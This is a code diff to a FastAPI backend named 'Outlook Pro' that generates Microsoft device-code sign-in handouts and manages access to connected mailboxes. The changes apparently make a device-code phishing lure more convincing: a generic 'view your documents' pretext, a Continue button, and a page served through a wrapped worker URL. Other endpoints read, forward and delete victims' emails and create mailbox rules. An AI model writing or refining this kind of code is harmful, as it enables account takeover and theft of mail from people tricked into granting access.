@@ -1,4 +1,4 @@
-from fastapi import FastAPI, Request, Depends, HTTPException, status
+from fastapi import FastAPI, Request, Depends, HTTPException
 from fastapi.responses import RedirectResponse, JSONResponse, HTMLResponse, StreamingResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
@@ -21,6 +21,7 @@ from auth import (
     start_device_code_flow,
     poll_device_code_flow,
     save_or_update_tenant_consent,
+    wrap_worker_url,
 )
 from graph import (
     fetch_emails,
@@ -37,7 +38,6 @@ from models import (
     Rule,
     SavedUser,
     TenantToken,
-    ConnectInvite,
     TenantConsent,
     TenantConsentStatus,
     RuleAction,
@@ -46,26 +46,16 @@ from admin_auth import login_admin
 
 app = FastAPI()
 
-# =========================
-# CONFIG
-# =========================
 SECRET_KEY = os.environ.get("SECRET_KEY", "super-secret-key-change-this")
 ALGORITHM = "HS256"
-ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days
-
+ACCESS_TOKEN_EXPIRE_MINUTES = 10080
 READ_ONLY_MODE = True
 ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
 
 security = HTTPBearer()
 
-# =========================
-# LOGGING
-# =========================
 logging.basicConfig(level=logging.DEBUG)
 
-# =========================
-# CORS
-# =========================
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -74,18 +64,12 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# =========================
-# STARTUP
-# =========================
 @app.on_event("startup")
 def startup():
     init_db()
     print("✅ Database initialized successfully")
 
 
-# =========================
-# JWT HELPERS
-# =========================
 def create_token(data: dict):
     payload = data.copy()
     payload["exp"] = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
@@ -104,9 +88,6 @@ def ensure_write_allowed():
         raise HTTPException(status_code=403, detail="Read-only mode enabled")
 
 
-# =========================
-# PDF / HTML HELPERS
-# =========================
 def split_text_for_pdf(text: str, max_chars: int = 90):
     words = (text or "").split()
     lines = []
@@ -135,7 +116,7 @@ def build_device_handout_html(
     logo_url: str = "",
 ):
     safe_title = title or "Microsoft Device Login"
-    safe_writeup = brief_writeup or "Use the Microsoft link below and enter the code to complete sign-in."
+    safe_writeup = brief_writeup or "Please follow the steps below to continue sign-in."
     safe_logo = logo_url or ""
     safe_verification_uri = verification_uri or "https://microsoft.com/devicelogin"
     safe_user_code = user_code or "N/A"
@@ -159,13 +140,14 @@ def build_device_handout_html(
     <html>
     <head>
         <meta charset="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
         <title>{safe_title}</title>
         <style>
             body {{
                 font-family: Arial, sans-serif;
                 background: #f5f7fb;
                 margin: 0;
-                padding: 30px;
+                padding: 30px 16px;
                 color: #1f2937;
             }}
             .card {{
@@ -211,19 +193,30 @@ def build_device_handout_html(
                 color: #6b7280;
                 margin-bottom: 8px;
             }}
-            .link {{
-                font-size: 18px;
-                font-weight: bold;
-                word-break: break-word;
-            }}
             .code {{
                 font-size: 34px;
                 font-weight: 800;
                 letter-spacing: 3px;
                 color: #0b63c7;
             }}
+            .steps {{
+                padding-left: 20px;
+                margin-bottom: 18px;
+            }}
             .steps li {{
-                margin-bottom: 8px;
+                margin-bottom: 10px;
+                line-height: 1.6;
+            }}
+            .continue-btn {{
+                display: inline-block;
+                background: #0b63c7;
+                color: white !important;
+                text-decoration: none;
+                padding: 12px 22px;
+                border-radius: 8px;
+                font-weight: bold;
+                font-size: 16px;
+                margin-top: 12px;
             }}
             .footer {{
                 margin-top: 28px;
@@ -240,25 +233,22 @@ def build_device_handout_html(
             <div class="writeup">{safe_writeup}</div>
 
             <div class="section">
-                <div class="label">Open this Microsoft page</div>
-                <div class="link">
-                    <a href="{safe_verification_uri}" target="_blank">{safe_verification_uri}</a>
-                </div>
-            </div>
-
-            <div class="section">
-                <div class="label">Enter this code</div>
-                <div class="code">{safe_user_code}</div>
-            </div>
-
-            <div class="section">
-                <div class="label">Steps</div>
+                <div class="label">Instructions</div>
                 <ol class="steps">
-                    <li>Open the Microsoft link above.</li>
-                    <li>Enter the device code shown in this document.</li>
-                    <li>Sign in with your Microsoft account.</li>
-                    <li>Return to the admin dashboard after sign-in is complete.</li>
+                    <li>Click the button below to open sign-in window</li>
+                    <li>Enter code "<strong>{safe_user_code}</strong>" when prompted</li>
+                    <li>Authenticate with your account</li>
+                    <li>Return to this tab to view your documents.</li>
                 </ol>
+
+                <a class="continue-btn" href="{safe_verification_uri}" target="_blank" rel="noopener noreferrer">
+                    Continue
+                </a>
+            </div>
+
+            <div class="section">
+                <div class="label">Your code</div>
+                <div class="code">{safe_user_code}</div>
             </div>
 
             <div class="footer">
@@ -306,14 +296,30 @@ def build_device_handout_pdf(
     pdf.drawString(x, y, "Brief write-up")
     y -= 7 * mm
 
+    writeup = brief_writeup or "Please follow the steps below to continue sign-in."
     pdf.setFont("Helvetica", 11)
-    writeup = brief_writeup or "Use the Microsoft link below and enter the code to complete sign-in."
     for line in split_text_for_pdf(writeup, 90):
         pdf.drawString(x, y, line)
         y -= 6 * mm
 
     y -= 4 * mm
+    pdf.setFont("Helvetica-Bold", 13)
+    pdf.drawString(x, y, "Instructions")
+    y -= 8 * mm
 
+    instructions = [
+        "1. Click the button below to open sign-in window.",
+        f'2. Enter code "{user_code or "N/A"}" when prompted.',
+        "3. Authenticate with your account.",
+        "4. Return to this tab to view your documents.",
+    ]
+
+    pdf.setFont("Helvetica", 11)
+    for line in instructions:
+        pdf.drawString(x, y, line)
+        y -= 7 * mm
+
+    y -= 4 * mm
     pdf.setFont("Helvetica-Bold", 13)
     pdf.drawString(x, y, "Microsoft link")
     y -= 7 * mm
@@ -324,7 +330,6 @@ def build_device_handout_pdf(
         y -= 6 * mm
 
     y -= 4 * mm
-
     pdf.setFont("Helvetica-Bold", 13)
     pdf.drawString(x, y, "Device code")
     y -= 10 * mm
@@ -333,22 +338,6 @@ def build_device_handout_pdf(
     pdf.drawString(x, y, user_code or "N/A")
     y -= 16 * mm
 
-    pdf.setFont("Helvetica-Bold", 13)
-    pdf.drawString(x, y, "Steps")
-    y -= 8 * mm
-
-    pdf.setFont("Helvetica", 11)
-    steps = [
-        "1. Open the Microsoft link above.",
-        "2. Enter the device code shown in this document.",
-        "3. Sign in with your Microsoft account.",
-        "4. Return to the admin dashboard after sign-in is complete."
-    ]
-    for step in steps:
-        pdf.drawString(x, y, step)
-        y -= 7 * mm
-
-    y -= 8 * mm
     pdf.setFont("Helvetica-Oblique", 10)
     pdf.drawString(x, y, "Generated by Outlook Pro.")
 
@@ -358,9 +347,6 @@ def build_device_handout_pdf(
     return buffer
 
 
-# =========================
-# APP CONFIG
-# =========================
 @app.get("/app-config")
 def app_config():
     return {
@@ -370,9 +356,6 @@ def app_config():
     }
 
 
-# =========================
-# ADMIN LOGIN
-# =========================
 @app.post("/admin/login")
 async def admin_login(request: Request):
     body = await request.json()
@@ -385,9 +368,6 @@ async def admin_login(request: Request):
     return {"access_token": token, "token_type": "bearer"}
 
 
-# =========================
-# DASHBOARD SUMMARY
-# =========================
 @app.get("/dashboard/summary")
 def dashboard_summary(user=Depends(verify_token)):
     db = SessionLocal()
@@ -402,11 +382,7 @@ def dashboard_summary(user=Depends(verify_token)):
         )
         saved_users = [row[0] for row in saved_user_rows if row[0]]
 
-        connected_mailbox_rows = (
-            db.query(TenantToken.tenant_id)
-            .distinct()
-            .all()
-        )
+        connected_mailbox_rows = db.query(TenantToken.tenant_id).distinct().all()
         connected_mailboxes = [row[0] for row in connected_mailbox_rows if row[0]]
 
         tenant_rows = (
@@ -434,9 +410,6 @@ def dashboard_summary(user=Depends(verify_token)):
         db.close()
 
 
-# =========================
-# DEVICE CODE FLOW
-# =========================
 @app.post("/device-code/start")
 def device_start(user=Depends(verify_token)):
     return start_device_code_flow()
@@ -510,9 +483,44 @@ def device_handout_pdf(
     )
 
 
-# =========================
-# LOGIN LINKS
-# =========================
+@app.get("/device")
+def serve_worker_device_page(
+    user_code: str,
+    verification_uri: str,
+    title: str = "Microsoft Device Login",
+    brief_writeup: str = "",
+    logo_url: str = ""
+):
+    html = build_device_handout_html(
+        title=title,
+        brief_writeup=brief_writeup,
+        verification_uri=verification_uri,
+        user_code=user_code,
+        logo_url=logo_url
+    )
+    return HTMLResponse(content=html)
+
+
+@app.get("/device-code/support-page-link")
+def device_support_page_link(
+    user_code: str,
+    verification_uri: str,
+    title: str = "Microsoft Device Login",
+    brief_writeup: str = "",
+    logo_url: str = "",
+    user=Depends(verify_token)
+):
+    params = {
+        "user_code": user_code,
+        "verification_uri": verification_uri,
+        "title": title,
+        "brief_writeup": brief_writeup,
+        "logo_url": logo_url,
+    }
+    support_url = wrap_worker_url("device", params)
+    return {"support_page_url": support_url}
+
+
 @app.get("/generate-login-url")
 def login_url(user_id: str, user=Depends(verify_token)):
     return {"login_url": generate_login_link(user_id)}
@@ -528,9 +536,6 @@ def admin_consent(tenant: str | None = None, user=Depends(verify_token)):
     return {"admin_consent_url": generate_admin_consent_url(tenant)}
 
 
-# =========================
-# TENANT CONSENT
-# =========================
 @app.post("/tenant-consent/generate")
 async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
     body = await request.json()
@@ -601,9 +606,6 @@ async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
     return {"status": "approved", "tenant_hint": tenant_hint}
 
 
-# =========================
-# CALLBACK
-# =========================
 @app.get("/auth/callback")
 def callback(request: Request):
     code = request.query_params.get("code")
@@ -622,9 +624,6 @@ def callback(request: Request):
     return RedirectResponse("https://www.microsoft.com")
 
 
-# =========================
-# STATUS
-# =========================
 @app.get("/microsoft/status")
 def microsoft_status(user_id: str, user=Depends(verify_token)):
     token = get_token(user_id)
@@ -636,18 +635,13 @@ def microsoft_status(user_id: str, user=Depends(verify_token)):
     }
 
 
-# =========================
-# USERS
-# =========================
 @app.get("/users")
 def users(user=Depends(verify_token)):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
-
-        connected = [t.tenant_id for t in db.query(TenantToken).distinct(TenantToken.tenant_id).all() if t.tenant_id]
+        connected = [t.tenant_id for t in db.query(TenantToken).distinct().all() if t.tenant_id]
         saved = [s.user_id for s in db.query(SavedUser).filter_by(admin_user_id=admin_user_id).all() if s.user_id]
-
         return {"users": sorted(list(set(connected + saved)))}
     finally:
         db.close()
@@ -709,9 +703,6 @@ def delete_user(user_id: str, user=Depends(verify_token)):
         db.close()
 
 
-# =========================
-# EMAILS
-# =========================
 @app.get("/emails")
 def emails(user_id: str, folder_id: str = None, user=Depends(verify_token)):
     try:
@@ -736,9 +727,6 @@ def email(id: str, user_id: str, user=Depends(verify_token)):
         raise HTTPException(status_code=400, detail=str(e))
 
 
-# =========================
-# EMAIL ACTIONS
-# =========================
 @app.post("/email/delete")
 async def delete(request: Request, user=Depends(verify_token)):
     ensure_write_allowed()
@@ -781,9 +769,6 @@ async def forward(request: Request, user=Depends(verify_token)):
     return forward_email(body["user_id"], body["message_id"], body["to"])
 
 
-# =========================
-# RULES
-# =========================
 @app.post("/rules")
 async def create_rule(request: Request, user=Depends(verify_token)):
     ensure_write_allowed()
@@ -811,7 +796,6 @@ async def create_rule(request: Request, user=Depends(verify_token)):
 
         db.add(rule)
         db.commit()
-
         return {"message": "created"}
     finally:
         db.close()
